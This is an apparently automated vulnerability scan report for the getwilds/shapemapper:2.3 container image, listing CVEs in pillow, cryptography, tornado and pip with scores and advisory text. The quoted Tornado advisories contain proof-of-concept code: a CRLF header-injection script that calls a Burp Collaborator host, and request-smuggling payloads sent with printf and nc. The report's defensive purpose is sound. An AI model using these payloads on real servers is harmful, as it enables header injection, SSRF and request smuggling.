# Vulnerability Report for getwilds/shapemapper:2.3

Report generated on 2025-06-20 19:50:01 PST

<h2>:mag: Vulnerabilities of <code>getwilds/shapemapper:2.3</code></h2>

<details open="true"><summary>:package: Image Reference</strong> <code>getwilds/shapemapper:2.3</code></summary>
<table>
<tr><td>digest</td><td><code>sha256:d79b96365a32f0da63952dbd9b51bf6c8b1835b2ba9193ddf1f8f5a2c481be27</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 1" src="https://img.shields.io/badge/critical-1-8b1924"/> <img alt="high: 17" src="https://img.shields.io/badge/high-17-e25d68"/> <img alt="medium: 32" src="https://img.shields.io/badge/medium-32-fbb552"/> <img alt="low: 7" src="https://img.shields.io/badge/low-7-fce1a9"/> <img alt="unspecified: 2" src="https://img.shields.io/badge/unspecified-2-lightgrey"/></td></tr>
<tr><td>platform</td><td>linux/amd64</td></tr>
<tr><td>size</td><td>1.1 GB</td></tr>
<tr><td>packages</td><td>248</td></tr>
</table>
</details></table>
</details>

<table>
<tr><td valign="top">
<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 3" src="https://img.shields.io/badge/H-3-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <img alt="unspecified: 2" src="https://img.shields.io/badge/U-2-lightgrey"/><strong>pillow</strong> <code>9.4.0</code> (pypi)</summary>

<small><code>pkg:pypi/pillow@9.4.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-50447?s=github&n=pillow&t=pypi&vr=%3C10.2.0"><img alt="critical 9.3: CVE--2023--50447" src="https://img.shields.io/badge/CVE--2023--50447-lightgrey?label=critical%209.3&labelColor=8b1924"/></a> <i>Improper Control of Generation of Code ('Code Injection')</i>

<table>
<tr><td>Affected range</td><td><code><10.2.0</code></td></tr>
<tr><td>Fixed version</td><td><code>10.2.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>9.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.554%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>67th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Pillow through 10.1.0 allows PIL.ImageMath.eval Arbitrary Code Execution via the environment parameter, a different vulnerability than CVE-2022-22817 (which was about the expression parameter).

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-4863?s=github&n=pillow&t=pypi&vr=%3C10.0.1"><img alt="high 8.8: CVE--2023--4863" src="https://img.shields.io/badge/CVE--2023--4863-lightgrey?label=high%208.8&labelColor=e25d68"/></a> <i>Out-of-bounds Write</i>

<table>
<tr><td>Affected range</td><td><code><10.0.1</code></td></tr>
<tr><td>Fixed version</td><td><code>10.0.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>93.991%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>100th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Heap buffer overflow in libwebp allow a remote attacker to perform an out of bounds memory write via a crafted HTML page.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-44271?s=github&n=pillow&t=pypi&vr=%3C10.0.0"><img alt="high 8.7: CVE--2023--44271" src="https://img.shields.io/badge/CVE--2023--44271-lightgrey?label=high%208.7&labelColor=e25d68"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code><10.0.0</code></td></tr>
<tr><td>Fixed version</td><td><code>10.0.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.148%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>36th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in Pillow before 10.0.0. It is a Denial of Service that uncontrollably allocates memory to process a given task, potentially causing a service to crash by having it run out of memory. This occurs for truetype in ImageFont when textlength in an ImageDraw instance operates on a long text argument.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-28219?s=github&n=pillow&t=pypi&vr=%3C10.3.0"><img alt="high 7.3: CVE--2024--28219" src="https://img.shields.io/badge/CVE--2024--28219-lightgrey?label=high%207.3&labelColor=e25d68"/></a> <i>Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</i>

<table>
<tr><td>Affected range</td><td><code><10.3.0</code></td></tr>
<tr><td>Fixed version</td><td><code>10.3.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.095%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>28th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In _imagingcms.c in Pillow before 10.3.0, a buffer overflow exists because strcpy is used instead of strncpy.

</blockquote>
</details>

<a href="https://scout.docker.com/v/GHSA-56pw-mpj4-fxww?s=gitlab&n=pillow&t=pypi&vr=%3C10.0.1"><img alt="unspecified : GHSA--56pw--mpj4--fxww" src="https://img.shields.io/badge/GHSA--56pw--mpj4--fxww-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> <i>OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities</i>

<table>
<tr><td>Affected range</td><td><code><10.0.1</code></td></tr>
<tr><td>Fixed version</td><td><code>10.0.1</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Pillow versions before v10.0.1 bundled libwebp binaries in wheels that is vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-5129?s=pypa&n=pillow&t=pypi&vr=%3C10.0.1"><img alt="unspecified : CVE--2023--5129" src="https://img.shields.io/badge/CVE--2023--5129-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code><10.0.1</code></td></tr>
<tr><td>Fixed version</td><td><code>10.0.1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.043%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 3" src="https://img.shields.io/badge/H-3-e25d68"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>cryptography</strong> <code>1.8.1</code> (pypi)</summary>

<small><code>pkg:pypi/cryptography@1.8.1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-50782?s=github&n=cryptography&t=pypi&vr=%3C42.0.0"><img alt="high 8.7: CVE--2023--50782" src="https://img.shields.io/badge/CVE--2023--50782-lightgrey?label=high%208.7&labelColor=e25d68"/></a> <i>Observable Discrepancy</i>

<table>
<tr><td>Affected range</td><td><code><42.0.0</code></td></tr>
<tr><td>Fixed version</td><td><code>42.0.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.521%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>66th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the python-cryptography package. This issue may allow a remote attacker to decrypt captured messages in TLS servers that use RSA key exchanges, which may lead to exposure of confidential or sensitive data.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2020-25659?s=github&n=cryptography&t=pypi&vr=%3C3.2"><img alt="high 8.2: CVE--2020--25659" src="https://img.shields.io/badge/CVE--2020--25659-lightgrey?label=high%208.2&labelColor=e25d68"/></a> <i>Covert Timing Channel</i>

<table>
<tr><td>Affected range</td><td><code><3.2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.343%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>56th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

RSA decryption was vulnerable to Bleichenbacher timing vulnerabilities, which would impact people using RSA decryption in online scenarios. This is fixed in cryptography 3.2. 

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-0286?s=github&n=cryptography&t=pypi&vr=%3E%3D0.8.1%2C%3C39.0.1"><img alt="high 7.4: CVE--2023--0286" src="https://img.shields.io/badge/CVE--2023--0286-lightgrey?label=high%207.4&labelColor=e25d68"/></a> <i>Access of Resource Using Incompatible Type ('Type Confusion')</i>

<table>
<tr><td>Affected range</td><td><code>>=0.8.1<br/><39.0.1</code></td></tr>
<tr><td>Fixed version</td><td><code>39.0.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.4</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>89.079%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>99th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8.1-39.0.0  are vulnerable to a security issue. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20221213.txt and https://www.openssl.org/news/secadv/20230207.txt.

If you are building cryptography source ("sdist") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-23931?s=github&n=cryptography&t=pypi&vr=%3E%3D1.8%2C%3C39.0.1"><img alt="medium 6.9: CVE--2023--23931" src="https://img.shields.io/badge/CVE--2023--23931-lightgrey?label=medium%206.9&labelColor=fbb552"/></a> <i>Improper Check for Unusual or Exceptional Conditions</i>

<table>
<tr><td>Affected range</td><td><code>>=1.8<br/><39.0.1</code></td></tr>
<tr><td>Fixed version</td><td><code>39.0.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.717%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>71st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Previously, `Cipher.update_into` would accept Python objects which implement the buffer protocol, but provide only immutable buffers:

```pycon
>>> outbuf = b"\x00" * 32
>>> c = ciphers.Cipher(AES(b"\x00" * 32), modes.ECB()).encryptor()
>>> c.update_into(b"\x00" * 16, outbuf)
16
>>> outbuf
b'\xdc\x95\xc0x\xa2@\x89\x89\xadH\xa2\x14\x92\x84 \x87\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

This would allow immutable objects (such as `bytes`) to be mutated, thus violating fundamental rules of Python. This is a soundness bug -- it allows programmers to misuse an API, it cannot be exploited by attacker controlled data alone.

This now correctly raises an exception.

This issue has been present since `update_into` was originally introduced in cryptography 1.8.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-0727?s=github&n=cryptography&t=pypi&vr=%3C42.0.2"><img alt="medium 5.5: CVE--2024--0727" src="https://img.shields.io/badge/CVE--2024--0727-lightgrey?label=medium%205.5&labelColor=fbb552"/></a> <i>NULL Pointer Dereference</i>

<table>
<tr><td>Affected range</td><td><code><42.0.2</code></td></tr>
<tr><td>Fixed version</td><td><code>42.0.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.217%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>45th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL
to crash leading to a potential Denial of Service attack

Impact summary: Applications loading files in the PKCS12 format from untrusted
sources might terminate abruptly.

A file in PKCS12 format can contain certificates and keys and may come from an
untrusted source. The PKCS12 specification allows certain fields to be NULL, but
OpenSSL does not correctly check for this case. This can lead to a NULL pointer
dereference that results in OpenSSL crashing. If an application processes PKCS12
files from an untrusted source using the OpenSSL APIs then that application will
be vulnerable to this issue.

OpenSSL APIs that are vulnerable to this are: PKCS12_parse(),
PKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes()
and PKCS12_newpass().

We have also fixed a similar issue in SMIME_write_PKCS7(). However since this
function is related to writing data we do not consider it security significant.

The FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue.

</blockquote>
</details>

<a href="https://scout.docker.com/v/GHSA-jm77-qphf-c4w8?s=github&n=cryptography&t=pypi&vr=%3E%3D0.8%2C%3C41.0.3"><img alt="low : GHSA--jm77--qphf--c4w8" src="https://img.shields.io/badge/GHSA--jm77--qphf--c4w8-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0.8<br/><41.0.3</code></td></tr>
<tr><td>Fixed version</td><td><code>41.0.3</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8-41.0.2 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230731.txt, https://www.openssl.org/news/secadv/20230719.txt, and https://www.openssl.org/news/secadv/20230714.txt.

If you are building cryptography source ("sdist") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.

</blockquote>
</details>

<a href="https://scout.docker.com/v/GHSA-5cpq-8wj7-hf2v?s=github&n=cryptography&t=pypi&vr=%3E%3D0.5%2C%3C%3D40.0.2"><img alt="low : GHSA--5cpq--8wj7--hf2v" src="https://img.shields.io/badge/GHSA--5cpq--8wj7--hf2v-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0.5<br/><=40.0.2</code></td></tr>
<tr><td>Fixed version</td><td><code>41.0.0</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.5-40.0.2 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://www.openssl.org/news/secadv/20230530.txt.

If you are building cryptography source ("sdist") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 4" src="https://img.shields.io/badge/M-4-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>tornado</strong> <code>6.2</code> (pypi)</summary>

<small><code>pkg:pypi/tornado@6.2</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-47287?s=github&n=tornado&t=pypi&vr=%3C6.5"><img alt="high 7.5: CVE--2025--47287" src="https://img.shields.io/badge/CVE--2025--47287-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Allocation of Resources Without Limits or Throttling</i>

<table>
<tr><td>Affected range</td><td><code><6.5</code></td></tr>
<tr><td>Fixed version</td><td><code>6.5.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.136%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>35th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

When Tornado's ``multipart/form-data`` parser encounters certain errors, it logs a warning but continues trying to parse the remainder of the data. This allows remote attackers to generate an extremely high volume of logs, constituting a DoS attack. This DoS is compounded by the fact that the logging subsystem is synchronous.

### Affected versions

All versions of Tornado prior to 6.5 are affected. The vulnerable parser is enabled by default.

### Solution

Upgrade to Tornado version 6.5. In the meantime, risk can be mitigated by blocking `Content-Type: multipart/form-data` in a proxy.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-52804?s=github&n=tornado&t=pypi&vr=%3C%3D6.4.1"><img alt="high 7.5: CVE--2024--52804" src="https://img.shields.io/badge/CVE--2024--52804-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code><=6.4.1</code></td></tr>
<tr><td>Fixed version</td><td><code>6.4.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.245%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>48th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The algorithm used for parsing HTTP cookies in Tornado versions prior to 6.4.2 sometimes has quadratic complexity, leading to excessive CPU consumption when parsing maliciously-crafted cookie headers. This parsing occurs in the event loop thread and may block the processing of other requests.

See also CVE-2024-7592 for a similar vulnerability in cpython.

</blockquote>
</details>

<a href="https://scout.docker.com/v/GHSA-w235-7p84-xx57?s=github&n=tornado&t=pypi&vr=%3C%3D6.4.0"><img alt="medium 6.5: GHSA--w235--7p84--xx57" src="https://img.shields.io/badge/GHSA--w235--7p84--xx57-lightgrey?label=medium%206.5&labelColor=fbb552"/></a> <i>Improper Neutralization of CRLF Sequences ('CRLF Injection')</i>

<table>
<tr><td>Affected range</td><td><code><=6.4.0</code></td></tr>
<tr><td>Fixed version</td><td><code>6.4.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
Tornado’s `curl_httpclient.CurlAsyncHTTPClient` class is vulnerable to CRLF (carriage return/line feed) injection in the request headers.

### Details
When an HTTP request is sent using `CurlAsyncHTTPClient`, Tornado does not reject carriage return (\r) or line feed (\n) characters in the request headers. As a result, if an application includes an attacker-controlled header value in a request sent using `CurlAsyncHTTPClient`, the attacker can inject arbitrary headers into the request or cause the application to send arbitrary requests to the specified server.

This behavior differs from that of the standard `AsyncHTTPClient` class, which does reject CRLF characters.

This issue appears to stem from libcurl's (as well as pycurl's) lack of validation for the [`HTTPHEADER`](https://curl.se/libcurl/c/CURLOPT_HTTPHEADER.html) option. libcurl’s documentation states:

> The headers included in the linked list must not be CRLF-terminated, because libcurl adds CRLF after each header item itself. Failure to comply with this might result in strange behavior. libcurl passes on the verbatim strings you give it, without any filter or other safe guards. That includes white space and control characters.

pycurl similarly appears to assume that the headers adhere to the correct format. Therefore, without any validation on Tornado’s part, header names and values are included verbatim in the request sent by `CurlAsyncHTTPClient`, including any control characters that have special meaning in HTTP semantics.

### PoC
The issue can be reproduced using the following script:

```python
import asyncio

from tornado import httpclient
from tornado import curl_httpclient

async def main():
    http_client = curl_httpclient.CurlAsyncHTTPClient()

    request = httpclient.HTTPRequest(
        # Burp Collaborator payload
        "http://727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com/",
        method="POST",
        body="body",
        # Injected header using CRLF characters
        headers={"Foo": "Bar\r\nHeader: Injected"}
    )

    response = await http_client.fetch(request)
    print(response.body)

    http_client.close()

if __name__ == "__main__":
    asyncio.run(main())
```

When the specified server receives the request, it contains the injected header (`Header: Injected`) on its own line:

```http
POST / HTTP/1.1
Host: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com
User-Agent: Mozilla/5.0 (compatible; pycurl)
Accept: */*
Accept-Encoding: gzip,deflate
Foo: Bar
Header: Injected
Content-Length: 4
Content-Type: application/x-www-form-urlencoded

body
```

The attacker can also construct entirely new requests using a payload with multiple CRLF sequences. For example, specifying a header value of `\r\n\r\nPOST /attacker-controlled-url HTTP/1.1\r\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com` results in the server receiving an additional, attacker-controlled request:

```http
POST /attacker-controlled-url HTTP/1.1
Host: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com
Content-Length: 4
Content-Type: application/x-www-form-urlencoded

body
```

### Impact
Applications using the Tornado library to send HTTP requests with untrusted header data are affected. This issue may facilitate the exploitation of server-side request forgery (SSRF) vulnerabilities.

</blockquote>
</details>

<a href="https://scout.docker.com/v/GHSA-753j-mpmx-qq6g?s=github&n=tornado&t=pypi&vr=%3C%3D6.4.0"><img alt="medium 5.3: GHSA--753j--mpmx--qq6g" src="https://img.shields.io/badge/GHSA--753j--mpmx--qq6g-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')</i>

<table>
<tr><td>Affected range</td><td><code><=6.4.0</code></td></tr>
<tr><td>Fixed version</td><td><code>6.4.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
When Tornado receives a request with two `Transfer-Encoding: chunked` headers, it ignores them both. This enables request smuggling when Tornado is deployed behind a proxy server that emits such requests. [Pound](https://en.wikipedia.org/wiki/Pound_(networking)) does this.

### PoC
0. Install Tornado.
1. Start a simple Tornado server that echoes each received request's body:
```bash
cat << EOF > server.py
import asyncio
import tornado

class MainHandler(tornado.web.RequestHandler):
    def post(self):
        self.write(self.request.body)

async def main():
    tornado.web.Application([(r"/", MainHandler)]).listen(8000)
    await asyncio.Event().wait()

asyncio.run(main())
EOF
python3 server.py &
```
2. Send a valid chunked request:
```bash
printf 'POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\n0\r\n\r\n' | nc localhost 8000
```
3. Observe that the response is as expected:
```
HTTP/1.1 200 OK
Server: TornadoServer/6.3.3
Content-Type: text/html; charset=UTF-8
Date: Sat, 07 Oct 2023 17:32:05 GMT
Content-Length: 1

Z
```
4. Send a request with two `Transfer-Encoding: chunked` headers:
```
printf 'POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\n0\r\n\r\n' | nc localhost 8000
```
5. Observe the strange response:
```
HTTP/1.1 200 OK
Server: TornadoServer/6.3.3
Content-Type: text/html; charset=UTF-8
Date: Sat, 07 Oct 2023 17:35:40 GMT
Content-Length: 0

HTTP/1.1 400 Bad Request

```
This is because Tornado believes that the request has no message body, so it tries to interpret `1\r\nZ\r\n0\r\n\r\n` as its own request, which causes a 400 response. With a little cleverness involving `chunk-ext`s, you can get Tornado to instead respond 405, which has the potential to desynchronize the connection, as opposed to 400 which should always result in a connection closure.

### Impact
Anyone using Tornado behind a proxy that forwards requests containing multiple `Transfer-Encoding: chunked` headers is vulnerable to request smuggling, which may entail ACL bypass, cache poisoning, or connection desynchronization.


</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-28370?s=github&n=tornado&t=pypi&vr=%3C6.3.2"><img alt="medium 5.3: CVE--2023--28370" src="https://img.shields.io/badge/CVE--2023--28370-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>URL Redirection to Untrusted Site ('Open Redirect')</i>

<table>
<tr><td>Affected range</td><td><code><6.3.2</code></td></tr>
<tr><td>Fixed version</td><td><code>6.3.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.430%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>62nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Open redirect vulnerability in Tornado versions 6.3.1 and earlier allows a remote unauthenticated attacker to redirect a user to an arbitrary web site and conduct a phishing attack by having user access a specially crafted URL.

</blockquote>
</details>

<a href="https://scout.docker.com/v/GHSA-qppv-j76h-2rpx?s=github&n=tornado&t=pypi&vr=%3C6.3.3"><img alt="medium : GHSA--qppv--j76h--2rpx" src="https://img.shields.io/badge/GHSA--qppv--j76h--2rpx-lightgrey?label=medium%20&labelColor=fbb552"/></a> <i>Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')</i>

<table>
<tr><td>Affected range</td><td><code><6.3.3</code></td></tr>
<tr><td>Fixed version</td><td><code>6.3.3</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary
Tornado interprets `-`, `+`, and `_` in chunk length and `Content-Length` values, which are not allowed by the HTTP RFCs. This can result in request smuggling when Tornado is deployed behind certain proxies that interpret those non-standard characters differently. This is known to apply to older versions of haproxy, although the current release is not affected.

## Details
Tornado uses the `int` constructor to parse the values of `Content-Length` headers and chunk lengths in the following locations:
### `tornado/http1connection.py:445`
```python3
            self._expected_content_remaining = int(headers["Content-Length"])
```
### `tornado/http1connection.py:621`
```python3
                content_length = int(headers["Content-Length"])  # type: Optional[int]
```
### `tornado/http1connection.py:671`
```python3
            chunk_len = int(chunk_len_str.strip(), 16)
```
Because `int("0_0") == int("+0") == int("-0") == int("0")`, using the `int` constructor to parse and validate strings that should contain only ASCII digits is not a good strategy. 



</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>pip</strong> <code>9.0.1</code> (pypi)</summary>

<small><code>pkg:pypi/pip@9.0.1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2019-20916?s=github&n=pip&t=pypi&vr=%3C19.2"><img alt="high 8.7: CVE--2019--20916" src="https://img.shields.io/badge/CVE--2019--20916-lightgrey?label=high%208.7&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><19.2</code></td></tr>
<tr><td>Fixed version</td><td><code>19.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.622%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>69th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The pip package before 19.2 for Python allows Directory Traversal when a URL is given in an install command, because a Content-Disposition header can have ../ in a filename, as demonstrated by overwriting the /root/.ssh/authorized_keys file. This occurs in _download_http_url in _internal/download.py. A fix was committed 6704f2ace.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-3572?s=github&n=pip&t=pypi&vr=%3C21.1"><img alt="high 7.1: CVE--2021--3572" src="https://img.shields.io/badge/CVE--2021--3572-lightgrey?label=high%207.1&labelColor=e25d68"/></a> <i>Improper Input Validation</i>

<table>
<tr><td>Affected range</td><td><code><21.1</code></td></tr>
<tr><td>Fixed version</td><td><code>21.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.240%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>47th percentile</code></td></tr>
</table>

